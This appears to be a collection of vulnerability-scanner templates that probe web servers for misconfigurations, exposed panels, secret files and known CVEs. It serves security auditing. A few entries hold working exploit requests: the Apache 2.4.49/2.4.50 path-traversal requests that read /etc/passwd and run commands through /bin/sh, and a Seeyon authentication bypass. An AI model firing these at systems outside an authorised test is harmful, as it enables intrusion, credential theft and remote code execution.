# Redmine settings.yml File Disclosure
- severity - info
- tags - misconfig,redmine,devops,files
## Requests
- Method - GET
### URL
- {{BaseURL}}/settings.yml
- {{BaseURL}}/config/settings.yml
- {{BaseURL}}/redmine/config/settings.yml
### Matchers

**Type - word**
- words
    1. format:
    2. default:
    3. Redmine
- condition - and

**Type - status**
- status
    1. 200

---
# Ruby on Rails secrets.yml File Exposure
- severity - high
- tags - misconfig,cloud,devops,files
## Requests
- Method - GET
### URL
- {{BaseURL}}/secrets.yml
- {{BaseURL}}/config/secrets.yml
- {{BaseURL}}/test/config/secrets.yml
- {{BaseURL}}/redmine/config/secrets.yml
### Matchers

**Type - regex**
- regex
    1. secret_key_base: ([a-z0-9]+)

**Type - word**
- part - header
- words
    1. application/json
    2. text/html
- negative - True
- condition - and

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- part - body
- group - 1
- regex
    1. secret_key_base: ([a-z0-9]+)

---
# db.xml File Exposure
- severity - medium
- tags - misconfig,db,files,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/db.xml
### Matchers

**Type - word**
- part - body
- words
    1. \<ServerName>
    2. \<DBPASS>
    3. \<DBtype>
- condition - and

**Type - status**
- status
    1. 200

---
# Weak Cipher Suites Detection
## Description
- A weak cipher is defined as an encryption/decryption algorithm that uses a key of insufficient length. Using an insufficient length for a key in an encryption/decryption algorithm opens up the possibility (or probability) that the encryption scheme could be broken.
- severity - medium
- tags - ssl,tls,misconfig

---
# WordPress Duplicator Plugin - Information disclosure
## Description
- Unauthenticated Information disclosure of Duplicator WordPress plugin sensitive files.

- severity - medium
- tags - wordpress,wp,wp-plugin,misconfig,disclosure,unauth,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/backups-dup-lite/tmp/
- {{BaseURL}}/wp-content/backups-dup-lite
### Matchers

**Type - word**
- part - body
- words
    1. Index of /wp-content/backups-dup-lite/

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# CORS Misconfiguration
- severity - info
- tags - cors,generic,misconfig
## Requests
### Step - 1
```
GET  HTTP/1.1
Host: {{Hostname}}
Origin: {{cors_origin}}

```
### Matchers

**Type - dsl**
- name - arbitrary-origin
- dsl
    1. contains(tolower(all_headers), 'access-control-allow-origin: {{cors_origin}}')
    2. contains(tolower(all_headers), 'access-control-allow-credentials: true')
- condition - and

**Payloads**- cors_origin

---
# Kiwi TCMS Information Disclosure
- severity - high
- tags - kiwitcms,exposure,misconfig,hackerone
## Requests
### Step - 1
```
POST /json-rpc/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept-Encoding: gzip, deflate

{"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. result
    2. username
    3. jsonrpc
    4. is_active
- condition - and
### Extractors

**Type - json**
- part - body
- json
    1. .result[].username

---
# Kubernetes Web View
- severity - medium
- tags - pane,misconfig,kubernetes,k8s
## Requests
- Method - GET
### URL
- {{BaseURL}}
- {{BaseURL}}/clusters/local
### Matchers

**Type - word**
- part - body
- words
    1. Kubernetes Web View\</title>
    2. a href="https://codeberg.org/hjacobs/kube-web-view
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Linkerd Panel - Detect
## Description
- Linkerd panel was detected.

- severity - high
- tags - panel,misconfig,linkerd,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/namespaces
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Linkerd\</title>
    2. data-controller-namespace="linkerd
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Unauth SmartPing Dashboard
- severity - low
- tags - panel,misconfig,unauth,smartping
## Requests
- Method - GET
### URL
- {{BaseURL}}/config.html
### Matchers

**Type - word**
- part - body
- words
    1. SmartPing Dashboard

**Type - status**
- status
    1. 200

---
# AEM Felix Console
## Description
- Felix Console is exposed, you may get RCE by installing OSGI bundle.
- severity - high
- tags - default-login,misconfig,aem,adobe
## Requests
- Method - GET
### URL
- {{BaseURL}}/system/console/bundles
- {{BaseURL}}///system///console///bundles
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Adobe Experience Manager Web Console - Bundles\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

**Payloads**- username
- password

---
# Dropbear sshd Weak Key Exchange Algorithms Enabled
## Description
- The SSH key exchange algorithm is fundamental to keep the protocol secure. It is what allows two previously unknown parties to generate a shared key in plain sight, and have that secret remain private to the client and server. Over time, some implementations of this algorithm have been identified as weak or vulnerable.

- severity - low
- tags - network,ssh,dropbear,misconfig

---
# Dropbear Weak MAC Algorithms Enabled
## Description
- The mac-alg command specifies which MAC algorithms in the SSH client profile for SSH encryption negotiation with an SFTP server when the DataPower Gateway acts as an SFTP client.

- severity - low
- tags - network,ssh,dropbear,misconfig

---
# Apache 2.4.49 - Path Traversal and Remote Code Execution
## Description
- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
- severity - high
- tags - cve,cve2021,lfi,rce,apache,misconfig,traversal,kev
## Requests
### Step - 1
```
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: {{Hostname}}

```
### Step - 2
```
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}

```
### Matchers

**Type - regex**
- name - LFI
- regex
    1. root:.*:0:0:

**Type - word**
- name - RCE
- words
    1. CVE-2021-41773-POC

---
# elFinder 2.1.58 - Remote Code Execution
## Description
- elFinder 2.1.58 is impacted by multiple remote code execution vulnerabilities that could allow an attacker to execute arbitrary code and commands on the server hosting the elFinder PHP connector, even with minimal configuration.
- severity - critical
- tags - cve,cve2021,elfinder,misconfig,rce,oss
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin/elfinder/elfinder-cke.html
- {{BaseURL}}/assets/backend/elfinder/elfinder-cke.html
- {{BaseURL}}/assets/elFinder-2.1.9/elfinder.html
- {{BaseURL}}/assets/elFinder/elfinder.html
- {{BaseURL}}/backend/elfinder/elfinder-cke.html
- {{BaseURL}}/elfinder/elfinder-cke.html
- {{BaseURL}}/uploads/assets/backend/elfinder/elfinder-cke.html
- {{BaseURL}}/uploads/assets/backend/elfinder/elfinder.html
- {{BaseURL}}/uploads/elfinder/elfinder-cke.html
### Matchers

**Type - word**
- words
    1. elfinder
    2. php/connector
- condition - and

**Type - status**
- status
    1. 200

---
# Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution
## Description
- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. In certain configurations, for instance if mod_cgi is enabled, this flaw can lead to remote code execution. This issue only affects Apache 2.4.49 and 2.4.50 and not earlier versions. Note - CVE-2021-42013 is due to an incomplete fix for the original vulnerability CVE-2021-41773.

- severity - critical
- tags - cve,cve2021,lfi,apache,rce,misconfig,traversal,kev
## Requests
### Step - 1
```
GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```
### Step - 2
```
GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```
### Step - 3
```
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}


```
### Matchers

**Type - regex**
- name - LFI
- regex
    1. root:.*:0:0:

**Type - word**
- name - RCE
- words
    1. CVE-2021-42013

---
# Authentication Bypass InfluxDB
## Description
- InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).
- severity - critical
- tags - unauth,db,influxdb,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/query?db=db&q=SHOW%20DATABASES
### Matchers

**Type - word**
- part - body
- words
    1. "results":
    2. "name":"databases"
- condition - and

**Type - status**
- status
    1. 200

---
# Oracle E-Business Suite \<=12.2 - Authentication Bypass
## Description
- Oracle E-Business Suite (component: Manage Proxies) 12.1 and 12.2 are susceptible to an easily exploitable vulnerability that allows an unauthenticated attacker with network access via HTTP to compromise it by self-registering for an account. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle E-Business Suite accessible data.

- severity - high
- tags - cve,cve2022,oracle,misconfig,auth-bypass
## Requests
- Method - GET
### URL
- {{BaseURL}}/OA_HTML/ibeCAcpSSOReg.jsp
### Matchers

**Type - word**
- words
    1. Registration
    2. Register as individual
    3. \<!-- ibeCZzpRuntimeIncl.jsp end -->
- condition - and

**Type - status**
- status
    1. 200

---
# DWR detect test page detection
## Description
- The index contains the list of exposed Java classes. From here one can navigate to the test page of each class where every callable method is described and can be easily tested. This is a great way to find out what methods are exposed and learn how they function.
- severity - low
- tags - tech,misconfig,dwr
## Requests
- Method - GET
### URL
- {{BaseURL}}/dwr/index.html
### Matchers

**Type - word**
- part - body
- words
    1. \<title>DWR Test Index\</title>

**Type - status**
- status
    1. 200

---
# Codis Dashboard Exposure
- severity - low
- tags - misconfig,exposure,codis
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Codis • Dashboard
    2. Sessions
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# TYPO3 Debug Mode Enabled
- severity - low
- tags - typo3,debug,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. TYPO3 Exception
    2. Uncaught TYPO3 Exception
- condition - or

**Type - status**
- status
    1. 500

---
# Global Traffic Statistics Exposure
- severity - low
- tags - misconfig,global,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Global Traffic Statistics
    2. Listening on
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Apache Druid Unauth
- severity - low
- tags - misconfig,druid,unauth,apache
## Requests
- Method - GET
### URL
- {{BaseURL}}/unified-console.html
### Matchers

**Type - word**
- words
    1. \<title>Apache Druid\</title>

**Type - status**
- status
    1. 200

---
# HiveQueue Agent
- severity - low
- tags - misconfig,hivequeue
## Requests
- Method - GET
### URL
- {{BaseURL}}/monitoring
### Matchers

**Type - word**
- part - body
- words
    1. \<title>HiveQueue Agent\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Bootstrap Admin Panel Template
- severity - info
- tags - bootstrap,panel,misconfig,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Dashboard - Bootstrap Admin Template
    2. Bootstrap Responsive Admin Template
- condition - and

**Type - word**
- part - body
- words
    1. Bootstrap Admin Template

---
# GLPI Directory Listing
## Description
- In certain cases, system administrators leave directory listing enabled which can sometimes expose sensitive files.
- severity - low
- tags - glpi,misconfig
## Requests
### Step - 1
```
GET {{expose_data}} HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. Index of /glpi/

**Type - status**
- status
    1. 200

**Payloads**- expose_data

---
# Seeyon Unauthoried Access
- severity - high
- tags - misconfig,seeyon,unauth
## Requests
### Step - 1
```
POST /seeyon/thirdpartyController.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: deflate

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4

```
### Step - 2
```
GET /seeyon/main.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: deflate
Content-Type: application/x-www-form-urlencoded
Cookie: {{session}}

```
### Matchers

**Type - word**
- part - body
- words
    1. 当前已登录了一个用户，同一窗口中不能登录多个用户
    2. \<a href='/seeyon/main.do?method=logout'
- condition - and

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- name - session
- part - header
- internal - True
- regex
    1. JSESSIONID=(.*)

---
# SQLiteManager - Text Display
## Description
- SQLiteManager panel contains inconsistent text display in title and text.
- severity - medium
- tags - misconfig,sqlite,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}
- {{BaseURL}}/sqlite/
- {{BaseURL}}/sqlitemanager/
### Matchers

**Type - word**
- words
    1. \<title>SQLiteManager\</title>

**Type - status**
- status
    1. 200

---
# Apache Drill Exposure
- severity - low
- tags - misconfig,exposure,apache,drill
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Apache Drill\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SSRF due to misconfiguration in OAuth
## Description
- Sends a POST request with the endpoint "/connect/register" to check external Interaction with multiple POST parameters.
- severity - medium
- tags - misconfig,oast,oauth,ssrf
## Requests
### Step - 1
```
POST /connect/register HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept-Language: en-US,en;q=0.9

{
  "application_type": "web",
  "redirect_uris": ["https://{{interactsh-url}}/callback"],
  "client_name": "{{Hostname}}",
  "logo_uri": "https://{{interactsh-url}}/favicon.ico",
  "subject_type": "pairwise",
  "token_endpoint_auth_method": "client_secret_basic",
  "request_uris": ["https://{{interactsh-url}}"]
}

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. dns

---
# HFS Exposure
- severity - unknown
- tags - misconfig,hfs,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. HFS /
    2. Messages
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress User Registration Enabled
## Description
- Your WordPress site is currently configured so that anyone can register as a user. If you are not using this functionality, it's recommended to disable user registration as it caused some security issues in the past and is increasing the attack surface.

- severity - info
- tags - wordpress,wp,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-login.php
### Matchers

**Type - word**
- part - body
- words
    1. ?action=register"

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Kafka Cruise Control UI
- severity - medium
- tags - kafka,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- words
    1. \<title>Kafka Cruise Control UI\</title>

---
# Zabbix Error
- severity - info
- tags - zabbix,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- words
    1. \<title>Warning [refreshed every 30 sec.]\</title>

**Type - status**
- status
    1. 200

---
# SkyCaiji - Exposed Installation
## Description
- SkyCaiji was discovered.
- severity - high
- tags - tech,skycaiji,exposure,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?s=/install/index/index
### Matchers

**Type - word**
- part - body
- words
    1. \<title>蓝天采集器 SkyCaiji 安装\</title>
    2. https://www.skycaiji.com
    3. \<a href="/index.php?s=/Install/Index/step1" class="btn btn-lg btn-success">
- condition - and

**Type - status**
- status
    1. 200

---
# cAdvisor Exposure
- severity - medium
- tags - exposure,misconfig,dashboard
## Requests
- Method - GET
### URL
- {{BaseURL}}/containers/
### Matchers

**Type - word**
- part - body
- words
    1. \<title>cAdvisor - /\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Cloudflare External Image Resizing Misconfiguration
## Description
- Cloudflare Image Resizing defaults to restricting resizing to the same domain. This prevents third parties from resizing any image at any origin. However, you can enable this option if you check Resize images from any origin.
- severity - info
- tags - cloudflare,misconfig,oast
## Requests
### Step - 1
```
GET /cdn-cgi/image/width/https://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
Accept: */*

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Rekognition Image Validation Debug UI
- severity - info
- tags - misconfig,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- words
    1. Rekognition Image Validation Debug UI\</title>
    2. Optional Parameters
- condition - and

**Type - status**
- status
    1. 200

---
# IIS Internal IP Disclosure Template
- severity - info
- tags - iis,misconfig,disclosure
## Requests
### Step - 1
```
GET / HTTP/1.0
Accept: */*


```
### Step - 2
```
GET / HTTP/1.0
Host:
Accept: */*


```
### Matchers

**Type - regex**
- part - location
- regex
    1. ([0-9]{1,3}[\.]){3}[0-9]{1,3}

**Type - status**
- status
    1. 301
    2. 302
### Extractors

**Type - regex**
- part - location
- regex
    1. ([0-9]{1,3}[\.]){3}[0-9]{1,3}

---
# Symfony FOSJsRoutingBundle
- severity - medium
- tags - misconfig,symfony
## Requests
- Method - GET
### URL
- {{BaseURL}}/js/routing?callback=fos.Router.setDatafoobarfoo
### Matchers

**Type - word**
- part - body
- words
    1. /**/fos.Router.setDatafoobarfoo({
    2. routes
- condition - and

**Type - word**
- part - header
- words
    1. application/javascript

**Type - status**
- status
    1. 200

---
# HTTP Missing Security Headers
## Description
- This template searches for missing HTTP security headers. The impact of these missing headers can vary.

- severity - info
- tags - misconfig,headers,generic
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - dsl**
- name - strict-transport-security
- dsl
    1. !regex('(?i)strict-transport-security', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - content-security-policy
- dsl
    1. !regex('(?i)content-security-policy', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - permissions-policy
- dsl
    1. !regex('(?i)permissions-policy', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - x-frame-options
- dsl
    1. !regex('(?i)x-frame-options', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - x-content-type-options
- dsl
    1. !regex('(?i)x-content-type-options', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - x-permitted-cross-domain-policies
- dsl
    1. !regex('(?i)x-permitted-cross-domain-policies', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - referrer-policy
- dsl
    1. !regex('(?i)referrer-policy', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - clear-site-data
- dsl
    1. !regex('(?i)clear-site-data', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - cross-origin-embedder-policy
- dsl
    1. !regex('(?i)cross-origin-embedder-policy', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - cross-origin-opener-policy
- dsl
    1. !regex('(?i)cross-origin-opener-policy', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - cross-origin-resource-policy
- dsl
    1. !regex('(?i)cross-origin-resource-policy', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - access-control-allow-origin
- dsl
    1. !regex('(?i)access-control-allow-origin', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - access-control-allow-credentials
- dsl
    1. !regex('(?i)access-control-allow-credentials', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - access-control-expose-headers
- dsl
    1. !regex('(?i)access-control-expose-headers', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - access-control-max-age
- dsl
    1. !regex('(?i)access-control-max-age', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - access-control-allow-methods
- dsl
    1. !regex('(?i)access-control-allow-methods', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

**Type - dsl**
- name - access-control-allow-headers
- dsl
    1. !regex('(?i)access-control-allow-headers', all_headers)
    2. status_code != 301 && status_code != 302
- condition - and

---
# Ray Dashboard Exposure
- severity - low
- tags - misconfig,exposure,ray
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Ray Dashboard
    2. webpackJsonpray-dashboard-client
- condition - and

**Type - status**
- status
    1. 200

---
# phpMemcachedAdmin Panel
- severity - medium
- tags - phpmemcached,exposure,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. phpMemcachedAdmin
    2. Execute Commands on Servers
- condition - and
- case-insensitive - True
### Extractors

**Type - regex**
- part - body
- group - 1
- regex
    1. MemcachedAdmin ([0-9.]+)

---
# AWS bucket with Object listing
- severity - low
- tags - aws,misconfig,bucket
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<ListBucketResult xmlns=

**Type - word**
- part - header
- words
    1. application/xml
### Extractors

**Type - regex**
- part - body
- group - 1
- regex
    1. \<Name>([a-z0-9-._]+)

---
# Encompass CM1 Home Page - Detect
## Description
- Encompass CM1 home page was detected.
- severity - low
- tags - misconfig,encompass,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Encompass CM1 Home Page
    2. DIAGNOSTIC LINKS:
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Publicly exposed Kafdrop Interface
- severity - low
- tags - exposure,misconfig,kafdrop
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- words
    1. \<title>Kafdrop: Broker List\</title>
    2. Kafka Cluster Overview
- condition - and

---
# Shell History
## Description
- Discover history for bash, ksh, sh, and zsh
- severity - low
- tags - misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/.bash_history
- {{BaseURL}}/.ksh_history
- {{BaseURL}}/.sh_history
- {{BaseURL}}/.zsh_history
### Matchers

**Type - word**
- words
    1. mkdir 
    2. chmod 
    3. mv 
    4. nano 
    5. vim 
    6. pico 
    7. sudo 
    8. cd 
    9. cp 
    10. ps aux 
- condition - or

**Type - word**
- part - response
- words
    1. \<?xml
    2. \<env
    3. application/javascript
    4. application/json
    5. application/xml
    6. html>
    7. text/html
    8. image/
- negative - True

**Type - status**
- status
    1. 200

---
# IoT vDME Simulator
## Description
- Exposed IoT vDME Simulator panel allows anonymous access to create new Items.

- severity - low
- tags - exposure,misconfig,panel
## Requests
- Method - GET
### URL
- {{BaseURL}}
- {{BaseURL}}:9998
### Matchers

**Type - word**
- part - body
- words
    1. \<title>IoT vDME Simulator\</title>
    2. Configuration Repository
    3. Current configuration
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Atlassian Bamboo Build Dashboard
- severity - unknown
- tags - misconfig,atlassian,bamboo
## Requests
- Method - GET
### URL
- {{BaseURL}}/allPlans.action
### Matchers

**Type - word**
- words
    1. \<th>Project\</th>
    2. \<th>Plan\</th>
    3. \<th>Build\</th>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Misconfigured Concrete5
- severity - low
- tags - misconfig,concrete,cms
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. concrete5 has encountered an issue

---
# Unauthenticated Fastvue Dashboard
- severity - medium
- tags - panel,fastvue,unauth,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/dashboard.aspx
### Matchers

**Type - word**
- words
    1. \<title>Fastvue Sophos Reporter\</title>
    2. \<title>Fastvue Reporter for SonicWall\</title>
- condition - or

**Type - word**
- part - body
- words
    1. Dashboard

**Type - status**
- status
    1. 200

---
# AWS X-Ray Sample Application
## Description
- AWS X-Ray is a service that helps developers analyze and debug distributed applications.
- severity - info
- tags - misconfig,aws,x-ray,amazon
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<title>AWS X-Ray Sample Application\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Ampache Update Page Exposure
- severity - low
- tags - misconfig,ampache,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/update.php
### Matchers

**Type - word**
- part - body
- words
    1. Ampache Update
- case-insensitive - True

**Type - word**
- part - body
- words
    1. No Update Needed
    2. No updates needed
- negative - True

**Type - status**
- status
    1. 200

---
# System Properties Exposure
- severity - low
- tags - misconfig,system,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. System Properties:
    2. Environment Variables:
- condition - and

**Type - status**
- status
    1. 200

---
# Jaeger UI
- severity - low
- tags - misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/search
### Matchers

**Type - word**
- words
    1. \<title>Jaeger UI\</title>

**Type - status**
- status
    1. 200

---
# ESPEasy Mega Panel Exposure
- severity - high
- tags - misconfig,espeasy,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. ESP Easy Mega:
    2. Config
    3. Tools
- condition - and

**Type - status**
- status
    1. 200

---
# Database Error
- severity - info
- tags - misconfig,database
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- words
    1. \<title>Database Error\</title>

**Type - status**
- status
    1. 500

---
# Pa11y Dashboard Exposure
- severity - low
- tags - misconfig,exposure,pa11y
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Pa11y Dashboard
    2. Add new URL
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Pupet Node Manager
- severity - medium
- tags - node,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- words
    1. \<a href="/nodes">Nodes\</a>

**Type - status**
- status
    1. 200

---
# Jupyter notebooks exposed to reading and writing
- severity - High
- tags - jupyter,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \<title>Home Page - Select or create a notebook\</title>
    2. \<div> There are no notebooks running. \</div>
- condition - or

---
# LinkTap Gateway Exposure
- severity - low
- tags - misconfig,linktap,iot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Device infomation
    2. Ethernet settings
- condition - and

**Type - status**
- status
    1. 200

---
# XSS-Protection Header - Cross-Site Scripting
## Description
- Setting the XSS-Protection header is deprecated. Setting the header to anything other than `0` can actually introduce an XSS vulnerability.
- severity - info
- tags - xss,misconfig,generic
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - regex**
- part - header
- regex
    1. (?i)x-xss-protection: 0
- negative - True

**Type - regex**
- part - header
- regex
    1. (?i)x-xss-protection: 1+
### Extractors

**Type - kval**
- part - header
- kval
    1. x_xss_protection

---
# Glowroot Anonymous User
## Description
- Anonymous user access allows to understand the host internals
- severity - high
- tags - misconfig,unauth,glowroot
## Requests
- Method - GET
### URL
- {{BaseURL}}/backend/admin/users?username=anonymous
### Matchers

**Type - word**
- words
    1. "username":"anonymous"
    2. "Administrator"
    3. "newPassword":""
- condition - and

**Type - word**
- words
    1. application/json
- part - header

**Type - status**
- status
    1. 200

---
# Tomcat Cookie Exposed
- severity - low
- tags - misconfig,apache,tomcat,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/examples/servlets/servlet/CookieExample
### Matchers

**Type - word**
- words
    1. Cookies Example
    2. Your browser is sending the following cookies:
- condition - and

**Type - status**
- status
    1. 200

---
# Ace Admin Dashboard Exposure
- severity - medium
- tags - misconfig,exposure,aceadmin
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Dashboard - Ace Admin
    2. overview &amp; stats
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Formalms Exposed Installation
- severity - high
- tags - misconfig,formalms
## Requests
- Method - GET
### URL
- {{BaseURL}}/install/
### Matchers

**Type - word**
- part - body
- words
    1. \<title>forma.lms installer\</title>
    2. \<h1>forma.lms - Installation\</h1>
- condition - and

**Type - status**
- status
    1. 200

---
# QuestDB Console Exposure
- severity - low
- tags - misconfig,questdb,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. QuestDB · Console
    2. Server rejected file due to unsupported file format.
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Unauthenticated Etherpad
## Description
- Finds Etherpad instances that allow adding new notes without authentication.

- severity - low
- tags - etherpad,misconfig,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. index.createOpenPad
